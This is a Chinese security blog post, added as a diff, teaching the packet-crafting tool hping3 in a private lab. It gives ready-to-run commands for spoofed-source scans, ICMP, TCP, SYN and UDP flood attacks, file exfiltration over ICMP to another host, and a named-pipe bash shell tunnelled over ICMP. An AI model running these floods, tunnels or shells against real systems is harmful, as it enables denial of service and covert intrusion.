@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="老旧但不乏经典的高级组包工具 [ hping3 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>老旧但不乏经典的高级组包工具 [ hping3 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/11/15/hping3/">
+                老旧但不乏经典的高级组包工具 [ hping3 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-11-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/hping3/">hping3</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;一款经典的高级组包工具,虽然老旧,但不乏经典,你完全可以利用它任意组装专属的 tcp,udp,icmp 数据报文格式,废话不多说,咱们直奔主题…</p>
+<p>0x01 实验环境:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">kali</span> 			<span class="selector-tag">ip</span><span class="selector-pseudo">:192.168.3.38</span></div><div class="line"><span class="selector-tag">CentOS6</span><span class="selector-class">.9</span> <span class="selector-attr">[MidLAMP]</span> 	<span class="selector-tag">ip</span><span class="selector-pseudo">:192.168.3.16</span><span class="selector-attr">[eth1]</span>  192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.19</span><span class="selector-attr">[eth0]</span>	在此机器上编译安装<span class="selector-tag">hping3</span></div></pre></td></tr></table></figure></p>
+<p>0x02 编译安装 hping3:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install libpcap-devel tcl-devel -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> wget http://www.hping.org/hping3-20051105.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf hping3-20051105.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> hping3-20051105</span></div><div class="line"><span class="meta">#</span><span class="bash"> vi bytesex.h</span></div><div class="line">  || defined(__x86_64__) \	为了防止后续编译出错,需要在第一个判断下添加此句,如下图所示,添加64位系统平台</div><div class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure &amp;&amp; make &amp;&amp; make strip &amp;&amp; make install</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p><img src="/img/hping3_error.png" alt=""></p>
+<p>0x03 hping3 各基础选项用途:</p>
+<p>全局选项<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">I 	 指定所使用的网卡接口</span></div><div class="line">-<span class="ruby">c 	 指定发包个数</span></div><div class="line">-<span class="ruby">-fast 	 指定发包速率,每秒<span class="number">10</span>个</span></div><div class="line">-<span class="ruby">-faster 指定发包速率,每秒<span class="number">100</span>个</span></div><div class="line">-<span class="ruby">-flood	 指定发包速率,尽可能按最快速度发,不用回应</span></div><div class="line">-<span class="ruby">E 	 从指定的文件中读取数据</span></div><div class="line">-<span class="ruby">e	 增加签名,相当于连接<span class="string">'密码'</span></span></div><div class="line">-<span class="ruby">B 	 启用安全协议</span></div><div class="line">-<span class="ruby">T	 启用路由跟踪模式</span></div><div class="line">-<span class="ruby">d 	 指定data数据大小,默认为<span class="number">0</span></span></div><div class="line">-<span class="ruby">V 	 显示发包的详细过程</span></div></pre></td></tr></table></figure></p>
+<p>指定发包模式 [默认走的tcp模式]:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby"><span class="number">0</span>  原始ip模式,即RAWSOCKET</span></div><div class="line">-<span class="ruby"><span class="number">1</span>  icmp模式</span></div><div class="line">-<span class="ruby"><span class="number">2</span>  udp模式</span></div><div class="line">-<span class="ruby"><span class="number">8</span>  扫描模式</span></div><div class="line">-<span class="ruby"><span class="number">9</span>  被动监听模式,可用于正向shell连接</span></div></pre></td></tr></table></figure></p>
+<p>ip配置选项:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">a		伪造源ip</span></div><div class="line">-<span class="ruby">-rand-dest 	使用随机目的地址</span></div><div class="line">-<span class="ruby">-rand-source	使用随机源地址</span></div><div class="line">-<span class="ruby">t		指定ttl值,默认为<span class="number">64</span></span></div><div class="line">-<span class="ruby">f 		使用分片发送</span></div></pre></td></tr></table></figure></p>
+<p>icmp配置选项:<br><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="deletion">-C 指定icmp类型</span></div></pre></td></tr></table></figure></p>
+<p>udp/tcp配置选项:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">s 使用指定的源端口,默认是随机的</span></div><div class="line">-<span class="ruby">p 指定目的端口</span></div><div class="line">-<span class="ruby">w 指定数据包大小,默认为<span class="number">64</span></span></div><div class="line">-<span class="ruby">F 使用FIN标志</span></div><div class="line">-<span class="ruby">S 使用SYN标志</span></div><div class="line">-<span class="ruby">R 使用RST标志</span></div><div class="line">-<span class="ruby">A 使用ACK标志</span></div><div class="line">-<span class="ruby">U 使用RUG标志</span></div><div class="line">-<span class="ruby">P 使用PUSH标志</span></div></pre></td></tr></table></figure></p>
+<p>0x04 常规用法:</p>
+<p>直接ping,注意,默认用的是tcp的<code>ping</code>,而非icmp<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">hping3</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>  </div><div class="line"># <span class="selector-tag">tcpdump</span> <span class="selector-tag">-i</span> <span class="selector-tag">eth0</span> <span class="selector-tag">dst</span> <span class="selector-tag">host</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hping common.png" alt=""></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-1</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> -c <span class="number">2</span></div></pre></td></tr></table></figure>
+<p><img src="/img/hping3 icmp.png" alt=""></p>
+<p>使用icmp扫描C段存活主机<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> ipaddr <span class="keyword">in</span> $(seq 1 254);<span class="keyword">do</span> hping3 192.168.3.<span class="variable">$ipaddr</span> -c 1 -1 &amp; <span class="keyword">done</span></span></div></pre></td></tr></table></figure></p>
+<p>伪造各种源信息对目标进行探测<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-1</span> --fast -t <span class="number">128</span> -a <span class="number">192.168</span><span class="number">.3</span><span class="number">.128</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> -c <span class="number">100</span></div><div class="line"># tcpdump -i eth0 icmp</div></pre></td></tr></table></figure></p>
+<p><img src="/img/icmp mode.png" alt=""></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 -t <span class="number">128</span> -a <span class="number">192.168</span><span class="number">.3</span><span class="number">.128</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> -c <span class="number">100</span> --fast -s <span class="number">1235</span> -p <span class="number">1234</span> -c <span class="number">100</span></div><div class="line"># tcpdump -i eth0 tcp dst port <span class="number">1234</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcp mode.png" alt=""></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-2</span> --fast -c <span class="number">30</span> --rand-source <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div><div class="line"># tcpdump -i eth0 dst <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div></pre></td></tr></table></figure>
+<p><img src="/img/udp mode.png" alt=""></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 --fast -c <span class="number">30</span> --rand-source <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> -F -S</div><div class="line"># tcpdump -i eth0 dst <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div></pre></td></tr></table></figure>
+<p><img src="/img/FIN SYN.png" alt=""></p>
+<p>0x05 尝试利用hping3进行常规 tcp / udp 端口扫描,速度比一般的端口扫描工具确实要快很多:</p>
+<p>指定目标tcp端口范围进行扫描<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-8</span> <span class="number">70</span><span class="number">-5500</span> -S <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> -a <span class="number">192.168</span><span class="number">.3</span><span class="number">.178</span>	</div><div class="line"># tcpdump -i eth0 dst <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/tcp portscan.png" alt=""></p>
+<p>单个tcp端口扫描<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-8</span> <span class="number">80</span>,<span class="number">3306</span> -S <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div><div class="line"># tcpdump -i eth0 dst port <span class="number">3306</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/tcp portscan mysql.png" alt=""><br><img src="/img/tcp portscan mysql res.png" alt=""></p>
+<p>多个udp端口扫描<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-2</span> <span class="number">-8</span> <span class="number">160</span><span class="number">-170</span>  <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div><div class="line"># tcpdump -i eth0 udp</div></pre></td></tr></table></figure></p>
+<p>0x06 基于各种类型的洪水攻击 [ icmp,tcp,syn…udp flood ]:</p>
+<p>icmp flood<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-1</span> --flood <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> --rand-source		基于icmp的简易ddos</div><div class="line"># tcpdump -i eth0 icmp</div></pre></td></tr></table></figure></p>
+<p><img src="/img/icmp flood.png" alt=""></p>
+<p>tcp flood<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 -p <span class="number">80</span> --flood <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> --rand-source  	最简易的CC攻击效果</div><div class="line"># tcpdump -i eth0 dst port <span class="number">80</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/tcp flood.png" alt=""><br><img src="/img/tcp flood web res.png" alt=""></p>
+<p>syn flood<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 -p <span class="number">80</span> -S --flood <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> --rand-source</div><div class="line"># tcpdump -i eth0 dst port <span class="number">80</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/syn flood.png" alt=""></p>
+<p>syn ack flood<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 -p <span class="number">80</span> -S -A --flood <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> --rand-source</div><div class="line"># tcpdump -i eth0 dst port <span class="number">80</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/syn ack flood.png" alt=""></p>
+<p>udp flood<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">-2</span> --flood <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span> --rand-source</div><div class="line"># tcpdump -i eth0 udp</div></pre></td></tr></table></figure></p>
+<p><img src="/img/udp flood.png" alt=""></p>
+<p>0x07 利用hping3来传输文件 <code>其实就相当于在利用各种隧道传输数据</code>:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">192.168</span><span class="number">.3</span><span class="number">.38</span> --icmp -d <span class="number">120</span> --sign klion --file /etc/issue -c <span class="number">1</span> -I eth0	在目标机器上执行</div></pre></td></tr></table></figure></p>
+<p><img src="/img/file send.png" alt=""></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">hping3</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.38</span> <span class="selector-tag">--listen</span> <span class="selector-tag">klion</span> <span class="selector-tag">--icmp</span> <span class="selector-tag">-I</span> <span class="selector-tag">eth0</span> &gt; <span class="selector-tag">rev</span><span class="selector-class">.txt</span>	在本地机器上执行</div></pre></td></tr></table></figure>
+<p><img src="/img/file rev.png" alt=""></p>
+<p>0x08 尝试利用hping3在目标上建立一个正向shell,暂时还有些问题,待后续解决再推上来,不过话说回来,我们的主要目的还是用它来组包,至于弹shell,比它好的方式数不胜数,何必非要用它:</p>
+<p>在目标机器上执行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> mknod /tmp/<span class="keyword">in</span> p</span></div><div class="line"><span class="meta">#</span><span class="bash"> mknod /tmp/out p</span></div><div class="line"><span class="meta">#</span><span class="bash"> bash &lt;/tmp/<span class="keyword">in</span> &gt;/tmp/out 2&gt;&amp;1</span></div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> hping3 192.168.3.19 --listen klion -I eth0 --icmp &gt; /tmp/<span class="keyword">in</span> &amp; </span></div><div class="line"><span class="meta">#</span><span class="bash"> hping3 192.168.3.19 --sign klion -I eth0 --icmp -d 1200 --file /tmp/out &amp;</span></div></pre></td></tr></table></figure></p>
+<p>在本地机器上执行<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># hping3 <span class="number">192.168</span><span class="number">.3</span><span class="number">.19</span> --<span class="section">listen</span> klion -I eth0 --icmp &amp;</div><div class="line"># mknod /tmp/out p</div><div class="line"># hping3 <span class="number">192.168</span><span class="number">.3</span><span class="number">.19</span> --sign klion -I eth0 --icmp -d <span class="number">1200</span> --file /tmp/out &amp;</div><div class="line"># cat &gt; /tmp/out</div><div class="line">  id</div></pre></td></tr></table></figure></p>
+<p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;细心的朋友可能发现了,关于防火墙探测的部分,这里并没有提及,因为那个东西不是这么一款小工具就能搞定的,里面涉及的细节可能非常多,对于渗透来讲,也并不是非常实用,所以想想还是算了,作为基础,想必这些也差不多够用了,其实大家都看到了,工具本身并不难,难的是对tcp/ip协议栈的各个细节的理解和熟悉程度,从协议基础入手,工具自然就能游刃有余,说这款工具的主要目的还是想让大家更透彻的去理解各类端口扫描工具的底层实现细节,方便大家继续深入学习,that’s all… ^_^</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/hping3/">#hping3</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
